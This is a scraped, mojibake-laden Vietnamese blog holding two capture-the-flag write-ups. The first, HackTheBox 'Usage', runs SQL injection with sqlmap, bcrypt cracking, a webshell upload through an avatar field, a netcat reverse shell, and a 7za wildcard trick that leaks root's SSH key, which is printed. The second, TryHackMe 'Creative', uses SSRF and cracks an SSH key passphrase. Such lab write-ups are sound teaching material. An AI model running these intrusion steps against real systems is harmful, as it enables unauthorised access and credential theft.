system: Linux Ubuntu web application technology: Nginx 1.18.0 back-end DBMS: MySQL 8 [23:57:30] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries [23:57:30] [INFO] fetching current database [23:57:30] [INFO] resumed: usage_blog [23:57:30] [INFO] fetching tables for database: \u0026#39;usage_blog\u0026#39; [23:57:30] [INFO] fetching number of tables for database \u0026#39;usage_blog\u0026#39; [23:57:30] [INFO] resumed: 15 [23:57:30] [INFO] resumed: admin_menu [23:57:30] [INFO] resumed: admin_operation_log [23:57:30] [INFO] resumed: admin_permissions [23:57:30] [INFO] resumed: admin_role_menu [23:57:30] [INFO] resuming partial value: admi [23:57:30] [WARNING] running in a single-thread mode. Please consider usage of option \u0026#39;--threads\u0026#39; for faster data retrieval [23:57:30] [INFO] retrieved: you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y n_role_permissions [23:57:51] [INFO] retrieved: admin_role_users [23:58:05] [INFO] retrieved: admin_roles [23:58:11] [INFO] retrieved: admin_user_permissions [23:58:46] [INFO] retrieved: admin_users [23:58:53] [INFO] retrieved: blog [23:59:01] [INFO] retrieved: failed_jobs [23:59:24] [INFO] retrieved: migrations [23:59:46] [INFO] retrieved: password_reset_token Tiáº¿p tá»¥c khai thÃ¡c vá»›i db usage_blog vÃ  table admin_users\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB-Usage] â””â”€$ sudo sqlmap -r request.txt --level=5 --risk=3 -D usage_blog -T admin_users --dump --batch ___ __H__ ___ ___[\u0026#39;]_____ ___ ___ {1.8.4#stable} |_ -| . [\u0026#34;] | .\u0026#39;| . | |___|_ [\u0026#34;]_|_|_|__,| _| |_|V... |_| https://sqlmap.org ....... [00:07:18] [INFO] fetching columns for table \u0026#39;admin_users\u0026#39; in database \u0026#39;usage_blog\u0026#39; [00:07:18] [WARNING] running in a single-thread mode. Please consider usage of option \u0026#39;--threads\u0026#39; for faster data retrieval [00:07:18] [INFO] retrieved: you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y 8 [00:07:22] [INFO] retrieved: avatar [00:07:32] [INFO] retrieved: created_at [00:07:53] [INFO] retrieved: id [00:07:56] [INFO] retrieved: name [00:08:03] [INFO] retrieved: password [00:08:24] [INFO] retrieved: remember_token [00:08:49] [INFO] retrieved: updated_at [00:09:07] [INFO] retrieved: username [00:09:20] [INFO] fetching entries for table \u0026#39;admin_users\u0026#39; in database \u0026#39;usage_blog\u0026#39; [00:09:20] [INFO] fetching number of entries for table \u0026#39;admin_users\u0026#39; in database \u0026#39;usage_blog\u0026#39; [00:09:20] [INFO] resumed: 1 [00:09:20] [INFO] retrieved: Administrator [00:09:46] [INFO] retrieved: Tiáº¿p tá»¥c khai thÃ¡c vá»›i 2 cá»™t username vÃ  password\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB-Usage] â””â”€$ sudo sqlmap -r request.txt --level=5 --risk=3 -D usage_blog -T admin_users -C username,password --dump --batch ___ __H__ ___ ___[)]_____ ___ ___ {1.8.4#stable} |_ -| . [(] | .\u0026#39;| . | |___|_ [(]_|_|_|__,| _| |_|V... |_| https://sqlmap.org [00:12:26] [INFO] fetching entries of column(s) \u0026#39;password,username\u0026#39; for table \u0026#39;admin_users\u0026#39; in database \u0026#39;usage_blog\u0026#39; [00:12:26] [INFO] fetching number of column(s) \u0026#39;password,username\u0026#39; entries for table \u0026#39;admin_users\u0026#39; in database \u0026#39;usage_blog\u0026#39; [00:12:26] [INFO] resumed: 1 [00:12:26] [INFO] resumed: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 [00:12:26] [WARNING] running in a single-thread mode. Please consider usage of option \u0026#39;--threads\u0026#39; for faster data retrieval [00:12:26] [INFO] retrieved: you provided a HTTP Cookie header value, while target URL provides its own cookies within HTTP Set-Cookie header which intersect with yours. Do you want to merge them in further requests? [Y/n] Y admin Database: usage_blog Table: admin_users [1 entry] +----------+--------------------------------------------------------------+ | username | password | +----------+--------------------------------------------------------------+ | admin | $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2 | +----------+--------------------------------------------------------------+ [00:12:36] [INFO] table \u0026#39;usage_blog.admin_users\u0026#39; dumped to CSV file \u0026#39;/root/.local/share/sqlmap/output/usage.htb/dump/usage_blog/admin_users.csv\u0026#39; [00:12:36] [WARNING] HTTP error codes detected during run: 500 (Internal Server Error) - 20 times [00:12:36] [INFO] fetched data logged to text files under \u0026#39;/root/.local/share/sqlmap/output/usage.htb\u0026#39; john # Copy hash nÃ y ra file vÃ  sá»­ dá»¥ng john Ä‘á»ƒ crack password\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/HTB-Usage] â””â”€$ sudo john -w=/usr/share/wordlists/rockyou.txt hash Created directory: /root/.john Using default input encoding: UTF-8 Loaded 1 password hash (bcrypt [Blowfish 32/64 X3]) Cost 1 (iteration count) is 1024 for all loaded hashes Will run 4 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status ********** (?) 1g 0:00:00:16 DONE (2024-05-07 00:17) 0.06112g/s 99.02p/s 99.02c/s 99.02C/s alexis1..serena Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Shell upload # Thá»­ login vÃ o admin panel\nVÃ¬ Ä‘ang cÃ³ quyá»n admin rá»“i nÃªn tÃ´i sáº½ tÃ¬m xem cÃ³ chá»— nÃ o Ä‘á»ƒ upload shell lÃªn Ä‘Ã¢y Ä‘Æ°á»£c khÃ´ng.\ná» trong account setting, tÃ´i tÃ¬m tháº¥y pháº§n upload avatar. TÃ¬m kiáº¿m cÃ¡c lá»— há»•ng upload trÃªn admin panel cá»§a laravel 1.8.17, tÃ´i tÃ¬m tháº¥y CVE-2023-24249\nTÃ´i sáº½ thÃªm payload vÃ o má»™t áº£nh báº¥t ká»³ nÃ o Ä‘Ã³.\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads] â””â”€$ dp.jpg 1 image files updated Upload áº£nh nÃ y lÃªn admin pannel (tÃ­ch vÃ o Ã´ \u0026ldquo;Continue creating\u0026rdquo;) vÃ  báº­t Intercep: ON trÃªn burpsuite Ä‘á»ƒ thá»±c hiá»‡n upload\nBáº­t listener : nc -lnvp 9001\nTruy cáº­p vÃ o url admin.usage.htb/uploads/images/ vÃ  thÃªm tÃªn file shell vá»«a upload thÃ nh cÃ´ng vÃ o cuá»‘i\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads] â””â”€$ nc -lnvp 9001 listening on [any] 9001 ... connect to [10.10.14.150] from (UNKNOWN) [10.10.11.18] 36368 bash: cannot set terminal process group (1227): Inappropriate ioctl for device bash: no job control in this shell dash@usage:/var/www/html/project_admin/public/uploads/images$ id id uid=1000(dash) gid=1000(dash) groups=1000(dash) dash@usage:/var/www/html/project_admin/public/uploads/images$ User.txt # dash@usage:/var/www/html/project_admin/public/uploads/images$ cd cd dash@usage:~$ ls -la ls -la total 248 drwxr-x--- 6 dash dash 4096 May 7 08:48 . drwxr-xr-x 4 root root 4096 Aug 16 2023 .. lrwxrwxrwx 1 root root 9 Apr 2 20:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 dash dash 3771 Jan 6 2022 .bashrc drwx------ 3 dash dash 4096 Aug 7 2023 .cache drwxrwxr-x 4 dash dash 4096 Aug 20 2023 .config drwxrwxr-x 3 dash dash 4096 Aug 7 2023 .local -rw-r--r-- 1 dash dash 32 Oct 26 2023 .monit.id -rw-r--r-- 1 dash dash 5 May 7 08:48 .monit.pid -rw------- 1 dash dash 1192 May 7 08:48 .monit.state -rwx------ 1 dash dash 707 Oct 26 2023 .monitrc -rw-r--r-- 1 dash dash 807 Jan 6 2022 .profile drwx------ 2 dash dash 4096 May 7 08:15 .ssh -rwxr-xr-x 1 dash dash 55816 May 7 08:16 customchmod -rwxr-xr-x 1 dash dash 141832 May 7 08:20 customcp -rwxrwxrwx 1 dash dash 0 May 7 08:17 data -rw-r----- 1 root dash 33 May 7 08:05 user.txt Privilege escalation # Khai thÃ¡c cÃ¡c file cÃ³ trong thÆ° má»¥c cá»§a user dash, tÃ´i tÃ¬m Ä‘Æ°á»£c má»™t password trong file .monitrc\ndash@usage:~$ cat .monitrc cat .monitrc #Monitoring Interval in Seconds set daemon 60 #Enable Web Access set httpd port 2812 use address 127.0.0.1 allow admin:****************** #Apache check process apache with pidfile \u0026#34;/var/run/apache2/apache2.pid\u0026#34; if cpu \u0026gt; 80% for 2 cycles then alert #System Monitoring check system usage if memory usage \u0026gt; 80% for 2 cycles then alert if cpu usage (user) \u0026gt; 70% for 2 cycles then alert if cpu usage (system) \u0026gt; 30% then alert if cpu usage (wait) \u0026gt; 20% then alert if loadavg (1min) \u0026gt; 6 for 2 cycles then alert if loadavg (5min) \u0026gt; 4 for 2 cycles then alert if swap usage \u0026gt; 5% then alert check filesystem rootfs with path / if space usage \u0026gt; 80% then alert Thá»­ ssh vá»›i user dash nhÆ°ng khÃ´ng Ä‘Æ°á»£c. Kiá»ƒm tra /etc/passwd vÃ  tÃ´i cÃ³ thÃªm 1 user ná»¯a lÃ  xander. Thá»­ ssh vÃ o user nÃ y vá»›i password vá»«a tÃ¬m Ä‘Æ°á»£c\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads] â””â”€$ ssh xander@10.10.11.18 xander@10.10.11.18\u0026#39;s password: Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Tue May 7 08:50:59 AM UTC 2024 System load: 0.5537109375 Usage of /: 66.3% of 6.53GB Memory usage: 23% Swap usage: 0% Processes: 258 Users logged in: 1 IPv4 address for eth0: 10.10.11.18 IPv6 address for eth0: dead:beef::250:56ff:feb9:a482 Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue May 7 08:34:25 2024 from 10.10.14.5 xander@usage:~$ Thá»­ cÃ¡c cÃ¡ch khai thÃ¡c Ä‘Æ¡n giáº£n\nxander@usage:~$ sudo -l Matching Defaults entries for xander on usage: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User xander may run the following commands on usage: (ALL : ALL) NOPASSWD: /usr/bin/usage_management xander@usage:~$ file /usr/bin/usage_management /usr/bin/usage_management: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=fdb8c912d98c85eb5970211443440a15d910ce7f, for GNU/Linux 3.2.0, not stripped Sá»­ dá»¥ng strings Ä‘á»ƒ xem file binary nÃ y, cÃ³ má»™t vÃ i chá»— cáº§n lÆ°u Ã½\nPTE1 u+UH /var/www/html /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * Error changing working directory to /var/www/html /usr/bin/mysqldump -A \u0026gt; /var/backups/mysql_backup.sql Password has been reset. Choose an option: 1. Project Backup 2. Backup MySQL data 3. Reset admin password Enter your choice (1/2/3): Invalid choice. Pháº§n /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- *, tÃ´i Ä‘Ã£ tÃ¬m tháº¥y cÃ¡ch khai thÃ¡c nÃ³ trÃªn hacktricks book, cÃ³ tÃªn lÃ  Wildcards Spare tricks\nTÃ´i sáº½ thá»­ láº¥y private key cá»§a root (dÃ¹ tÃ´i khÃ´ng cháº¯c lÃ  nÃ³ cÃ³ tá»“n táº¡i hay khÃ´ng)\nxander@usage:~$ cd /var/www/html/ xander@usage:/var/www/html$ touch @id_rsa xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa xander@usage:/var/www/html$ sudo /usr/bin/usage_management Choose an option: 1. Project Backup 2. Backup MySQL data 3. Reset admin password Enter your choice (1/2/3): 1 7-Zip (a) [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs AMD EPYC 7313P 16-Core Processor (A00F11),ASM,AES-NI) Open archive: /var/backups/project.zip -- Path = /var/backups/project.zip Type = zip Physical Size = 54871532 Scanning the drive: WARNING: No more files -----BEGIN OPENSSH PRIVATE KEY----- WARNING: No more files b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW WARNING: No more files QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi WARNING: No more files QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3Q WARNING: No more files AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1Wx1IT31xsmrbSY6vosAdQzGif553PTtDs WARNING: No more files H2sfTWZeFDLGmqMhrqDdAAAACnJvb3RAdXNhZ2UBAgM= WARNING: No more files -----END OPENSSH PRIVATE KEY----- 2984 folders, 17973 files, 113884398 bytes (109 MiB) Updating archive: /var/backups/project.zip Items to compress: 20957 Files read from disk: 17973 Archive size: 54871955 bytes (53 MiB) Scan WARNINGS for files and folders: -----BEGIN OPENSSH PRIVATE KEY----- : No more files b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW : No more files QyNTUxOQAAACC20mOr6LAHUMxon+edz07Q7B9rH01mXhQyxpqjIa6g3QAAAJAfwyJCH8Mi : No more files QgAAAAtzc2gtZWQyNTUxOQAAACC20mOr6LAHUMxon+edz07********************* : No more files AAAEC63P+5DvKwuQtE4YOD4IEeqfSPszxqIL1W*************************** : No more files H2sfTWZeFDLGmqMhrqDdAAAA************************= : No more files -----END OPENSSH PRIVATE KEY----- : No more files ---------------- Scan WARNINGS: 7 Copy ná»™i dung cá»§a key nÃ y vá», xÃ³a háº¿t pháº§n thá»«a vÃ  lÆ°u thÃ nh id_rsa\nâ”Œâ”€â”€(kaliã‰¿kali)-[~/p0wny-shell] â””â”€$ chmod 600 id_rsa â”Œâ”€â”€(kaliã‰¿kali)-[~/p0wny-shell] â””â”€$ ssh -i id_rsa root@10.10.11.18 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-101-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/pro System information as of Tue May 7 09:33:54 AM UTC 2024 System load: 0.0390625 Usage of /: 65.6% of 6.53GB Memory usage: 21% Swap usage: 0% Processes: 230 Users logged in: 1 IPv4 address for eth0: 10.10.11.18 IPv6 address for eth0: dead:beef::250:56ff:feb9:6f7b Expanded Security Maintenance for Applications is not enabled. 0 updates can be applied immediately. Enable ESM Apps to receive additional future security updates. See https://ubuntu.com/esm or run: sudo pro status The list of available updates is more than a week old. To check for new updates run: sudo apt update Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings Last login: Tue May 7 09:02:51 2024 from 10.10.14.58 root@usage:~# id uid=0(root) gid=0(root) groups=0(root) root@usage:~# ls -la total 44 drwx------ 7 root root 4096 May 7 08:53 . drwxr-xr-x 19 root root 4096 Apr 2 21:15 .. lrwxrwxrwx 1 root root 9 Apr 2 20:22 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 root root 3106 Oct 15 2021 .bashrc drwxr-xr-x 3 root root 4096 Aug 24 2023 .cache -rwxr-xr-x 1 root root 307 Apr 3 13:24 cleanup.sh drwxr-xr-x 4 root root 4096 Aug 22 2023 .config drwxr-xr-x 3 root root 4096 Aug 21 2023 .local lrwxrwxrwx 1 root root 9 Apr 2 20:22 .mysql_history -\u0026gt; /dev/null -rw-r----- 1 root root 33 May 7 08:53 root.txt drwx------ 3 root root 4096 Aug 6 2023 snap drwx------ 2 root root 4096 Apr 2 23:07 .ssh -rw-r--r-- 1 root root 1444 Oct 28 2023 usage_management.c root@usage:~# ","date":"3 May 2024","externalUrl":null,"permalink":"/ctf/hackthebox/usage/","section":"Ctf","summary":"","title":"HackTheBox - Usage","type":"ctf"},{"content":"","date":"3 May 2024","externalUrl":null,"permalink":"/tags/laravel/","section":"Tags","summary":"","title":"Laravel","type":"tags"},{"content":"","date":"3 May 2024","externalUrl":null,"permalink":"/tags/sql-injection/","section":"Tags","summary":"","title":"Sql Injection","type":"tags"},{"content":"","date":"3 May 2024","externalUrl":null,"permalink":"/tags/wildcards-spare-tricks/","section":"Tags","summary":"","title":"Wildcards Spare Tricks","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/ffuf/","section":"Tags","summary":"","title":"Ffuf","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/ld_preload/","section":"Tags","summary":"","title":"Ld_preload","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/tags/tryhackme/","section":"Tags","summary":"","title":"Tryhackme","type":"tags"},{"content":"","date":"14 April 2024","externalUrl":null,"permalink":"/ctf/tryhackme/","section":"Ctf","summary":"","title":"TryHackMe","type":"ctf"},{"content":"TryHackMe - Creative\nReconnaissance and Scanning # PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 a0:5c:1c:4e:b4:86:cf:58:9f:22:f9:7c:54:3d:7e:7b (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCsXwQrUw2YlhqFRnJpLvzHz5VnTqQ/Xr+IMJmnIyh82p1WwUsnFHgAELVccD6DdB1ksKH5HxD8iBoY83p3d/UfM8xlPzWGZkTAfZ+SR1b6MJEJU/JEiooZu4aPe4tiRdNQKB09stTOfaMUFsbXSYGjvf5u+gavNZOOTCQxEoKeZzPzxUJ0baz/Vx5Elihfm3MoR0nrE2XFTY6HV2cwLojeWCww3njG+P1E4salm86MAswQWxOeHLk/a0wXJ343X5NaHNuF4Xo3PpqiUr+qEZUyZJKNrH4O8hErH/2h7AUEPpPIo7zEK1ZzqFNWcpOqguYOFVZMagHS//ASg3ikzouZS1nUmS7ehA9bGrhCbqMRSin1QJ/mnwYBylW6IsPyfuJfl9KFnbTITa56URmudd999UzNEj8Wx8Qj4LfTWKLubcYS9iKN+exbAxXOIdbpolVtIFh0mP/cm9WRhf0z9WR9tX1FvJYi013rcaMpy62pjPCO20nbNsnEG6QckMk/4RM= | 256 47:d5:bb:58:b6:c5:cc:e3:6c:0b:00:bd:95:d2:a0:fb (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOIFbjvSW+v5RoDWDKFI//sn2LxlSxk2ovUPyUzpB1g/XQLlbF1oy3To2D8N8LAWwrLForz4IJ4JrZXR5KvRK8Y= | 256 cb:7c:ad:31:41:bb:98:af:cf:eb:e4:88:7f:12:5e:89 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFf4qwz85WzZVwohJm4pYByLpBj7j2JiQp4cBqmaBwYV 80/tcp open http syn-ack ttl 63 nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Did not follow redirect to http://creative.thm |_http-server-header: nginx/1.18.0 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel ThÃªm domain vÃ o file hosts\nnano /etc/hosts\n10.10.55.1 creative.thm\nEnumeration # Truy cáº­p domain vá»›i port 80. Sau khi thá»­ cÃ¡c phÆ°Æ¡ng phÃ¡p Ä‘Æ¡n giáº£n Ä‘á»u khÃ´ng cÃ³ káº¿t quáº£, tÃ´i thá»­ tÃ¬m directory báº±ng dirsearch, trong khi chá» káº¿t quáº£ tá»« dirsearch, dá»±a vÃ o viá»‡c machine nÃ y cÃ³ domain, tÃ´i nghÄ© ngay Ä‘áº¿n viá»‡c tÃ¬m kiáº¿m subdomain tá»« domain nÃ y. Sá»­ dá»¥ng ffuf Ä‘á»ƒ tÃ¬m kiáº¿m subdomain\ndirsearch\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# dirsearch -u http://creative.thm /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/kali/reports/http_creative.thm/_24-04-14_12-45-22.txt Target: http://creative.thm/ [12:45:22] Starting: [12:46:05] 403 - 564B - /assets/ [12:46:05] 301 - 178B - /assets -\u0026gt; http://creative.thm/assets/ Task Completed ffuf\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ffuf -u http://creative.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \u0026#34;Host: FUZZ.creative.thm\u0026#34; -mc 200 /\u0026#39;___\\ /\u0026#39;___\\ /\u0026#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v2.1.0-dev ________________________________________________ :: Method : GET :: URL : http://creative.thm :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.creative.thm :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200 ________________________________________________ beta [Status: 200, Size: 591, Words: 91, Lines: 20, Duration: 252ms] :: Progress: [114441/114441] :: Job [1/1] :: 178 req/sec :: Duration: [0:11:26] :: Errors: 0 :: Truy cáº­p /assets/ nhÆ°ng tÃ´i gáº·p lá»—i Forbbiden - khÃ´ng cÃ³ quyá»n truy cáº­p vÃ o dir nÃ y. Quay láº¡i vá»›i subdomain vá»«a tÃ¬m Ä‘Æ°á»£c, thÃªm nÃ³ vÃ o file hosts\nnano /etc/hosts\n10.10.55.1 creative.thm beta.creative.thm\nTruy cáº­p vÃ o subdomain má»›i\nTÃ´i cÃ³ má»™t trang web kiá»ƒm tra URL á»Ÿ Ä‘Ã¢y. Sau má»™t lÃºc thá»­ nghiá»‡m cÃ¡c input, tÃ´i nháº­n ra vá»›i cÃ¡c input sai (khÃ´ng pháº£i Ä‘á»‹nh dáº¡ng URL hoáº·c báº¥t ká»³ Ä‘iá»u gÃ¬, thay vÃ¬ kiá»ƒm tra vÃ  tráº£ vá» káº¿t quáº£ input sai Ä‘á»‹nh dáº¡ng thÃ¬ web server tráº£ vá» káº¿t quáº£ lÃ  1 chá»¯ Dead. Äiá»u nÃ y cÃ³ nghÄ©a lÃ  server sáº½ xá»­ lÃ½ báº¥t ká»³ input nÃ o tÃ´i nháº­p vÃ o -\u0026gt; tÃ´i cÃ³ thá»ƒ thá»±c hiá»‡n SSRF á»Ÿ Ä‘Ã¢y.\nSá»­ dá»¥ng SSRFmap Ä‘á»ƒ kiá»ƒm tra.\nÄáº§u tiÃªn, tÃ´i sá»­ dá»¥ng Burpsuite Ä‘á»ƒ báº¯t request\nLÆ°u request nÃ y vÃ o 1 file vá»›i tÃªn resquest.txt\nPOST / HTTP/1.1 Host: beta.creative.thm User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 36 Origin: http://beta.creative.thm Connection: close Referer: http://beta.creative.thm/ Upgrade-Insecure-Requests: 1 url=..%2F..%2F..%2F..%2Fect%2Fpasswd Vá»›i parameter á»Ÿ request nÃ y lÃ  url, tÃ´i sáº½ sá»­ dá»¥ng SSRFmap vá»›i cÃ¡c module cÃ³ kháº£ nÄƒng tráº£ vá» káº¿t quáº£ nhÆ° portscan, networkscan, custom (cÃ¡c module khÃ¡c khÃ´ng Ä‘Æ°á»£c sá»­ dá»¥ng do khÃ´ng cÃ³ dá»‹ch vá»¥ cháº¡y trÃªn web server nÃ y trÃ¡nh máº¥t thá»i gian vÃ o viá»‡c scan)\nSau khi sá»­ dá»¥ng module portscan tÃ´i tÃ¬m Ä‘Æ°á»£c 1 port khÃ¡c ngoÃ i port 80 Ä‘ang má»Ÿ trÃªn localhost\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali/SSRFmap] â””â”€# python ssrfmap.py -r request.txt -p url -m portscan _____ _________________ / ___/ ___| ___ \\ ___| \\ `--.\\ `--.| |_/ / |_ _ __ ___ __ _ _ __ `--. \\`--. \\ /| _| \u0026#39;_ ` _ \\ / _` | \u0026#39;_ \\ /\\__/ /\\__/ / |\\ \\| | | | | | | | (_| | |_) | \\____/\\____/\\_| \\_\\_| |_| |_| |_|\\__,_| .__/ | | |_| [INFO]:Module \u0026#39;portscan\u0026#39; launched ! [13:26:45] IP:127.0.0.1 , Found filtered port nÂ°443 [13:26:45] IP:127.0.0.1 , Found filtered port nÂ°23 [13:26:45] IP:127.0.0.1 , Found filtered port nÂ°25 [13:26:45] IP:127.0.0.1 , Found open port nÂ°80 ..... [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°3999 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°740 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°12346 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°802 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°1127 [13:28:21] IP:127.0.0.1 , Found open port nÂ°1337 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°606 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°2600 [13:28:21] IP:127.0.0.1 , Found filtered port nÂ°1414 ...... Äá»ƒ truy cáº­p Ä‘Æ°á»£c cÃ¡c path nÃ y, tÃ´i pháº£i quay láº¡i vÃ  nháº­p thÃªm path vÃ o url Ä‘á»ƒ kiá»ƒm tra. Äá»ƒ viá»‡c nÃ y dá»… dÃ ng hÆ¡n thÃ¬ tÃ´i sáº½ sá»­ dá»¥ng Burpsuite Ä‘á»ƒ báº¯t request nÃ y vÃ  cho nÃ³ vÃ o repeater\nPháº§n url Ä‘Ã£ Ä‘Æ°á»£c encode nÃªn Ä‘á»ƒ truy cáº­p Ä‘Æ°á»£c cÃ¡c path tÃ´i cÅ©ng sáº½ pháº£i encode theo url format\nSSH # Äá»ƒ Ã½ cÃ³ thÆ° má»¥c .ssh, cÃ³ thá»ƒ sáº½ lÆ°u ssh key á»Ÿ Ä‘Ã¢y\nLáº¥y id_rsa\nLÆ°u key nÃ y vá» vÃ  login ssh\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# chmod 600 id_rsa â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh -i id_rsa saad@10.10.55.1 The authenticity of host \u0026#39;10.10.55.1 (10.10.55.1)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:09XvTnhtDcy1LRcuA8MJ6i3a1gN/7Prv5xmZF9v8Gq4. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;10.10.55.1\u0026#39; (ED25519) to the list of known hosts. Enter passphrase for key \u0026#39;id_rsa\u0026#39;: Váº­y lÃ  tÃ´i cáº§n passphrase. Sá»­ dá»¥ng john Ä‘á»ƒ crack pass tá»« key nÃ y\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# ssh2john id_rsa \u0026gt; id_rsa.hash â”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 2 (iteration count) is 16 for all loaded hashes Will run 6 OpenMP threads Press \u0026#39;q\u0026#39; or Ctrl-C to abort, almost any other key for status *********** (id_rsa) 1g 0:00:00:26 DONE (2024-04-14 14:02) 0.03818g/s 36.65p/s 36.65c/s 36.65C/s 242424..marie1 Use the \u0026#34;--show\u0026#34; option to display all of the cracked passwords reliably Session completed. Login ssh\nâ”Œâ”€â”€(rootã‰¿kali)-[/home/kali] â””â”€# john -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt id_rsa.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes Cost 